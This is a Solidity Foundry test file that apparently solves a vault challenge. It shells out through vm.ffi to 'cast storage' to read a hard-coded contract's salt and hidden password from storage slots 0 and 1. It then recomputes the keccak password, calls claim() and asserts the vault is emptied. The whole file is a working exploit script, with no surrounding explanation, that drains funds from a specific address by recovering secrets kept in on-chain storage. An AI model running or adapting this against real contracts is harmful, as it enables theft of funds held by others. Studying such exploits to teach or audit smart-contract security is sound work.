pragma solidity 0.8.22;

import {Vault} from "../src/Vault.sol";
import {Test, console} from "forge-std/Test.sol";

contract VaultAttactTest is Test {
    address public constant VAULT_ADDRESS = 0x7b8040fB84993f88546B46D29899A60Ea60E6FCc;
    string public constant VAULT_ADDRESS_STR = "0x7b8040fB84993f88546B46D29899A60Ea60E6FCc";

    function setUp() public {}

    function testVaultAttack() public {
        uint256 salt;
        uint256 hiddenPassword;

        string[] memory inputs = new string[](6);
        inputs[0] = "cast";
        inputs[1] = "storage";
        inputs[2] = VAULT_ADDRESS_STR;
        inputs[3] = "0"; // slot for salt
        inputs[4] = "--rpc-url";
        inputs[5] = vm.envString("RPC_URL");

        bytes memory output = vm.ffi(inputs);
        salt = abi.decode(output, (uint256));
        console.log("Salt from storage:", salt);

        inputs[3] = "1"; // slot for hiddenPassword
        output = vm.ffi(inputs);
        hiddenPassword = abi.decode(output, (uint256));
        console.log("Hidden Password from storage:", hiddenPassword);

        uint256 password = uint256(keccak256(abi.encode(hiddenPassword + salt)));

        // Values retrieved offchain
        uint256 saltOffchain = 0x00000000000000000000000000000000000000000000000000000000687117cf;
        uint256 hiddenPasswordOffchain = 0x00000000000000000000000000000000000000000000000000000000075bcd3f;
        uint256 passwordOffchain = uint256(keccak256(abi.encode(hiddenPasswordOffchain + saltOffchain)));

        assertEq(salt, saltOffchain, "Salt mismatch");
        assertEq(hiddenPassword, hiddenPasswordOffchain, "Hidden Password mismatch");
        assertEq(password, passwordOffchain, "Password mismatch");
        console.log("Encoded Password:", password);

        Vault(payable(VAULT_ADDRESS)).claim(password);
        assertEq(address(VAULT_ADDRESS).balance, 0, "Vault should be empty after claim");
    }

    receive() external payable {}
}
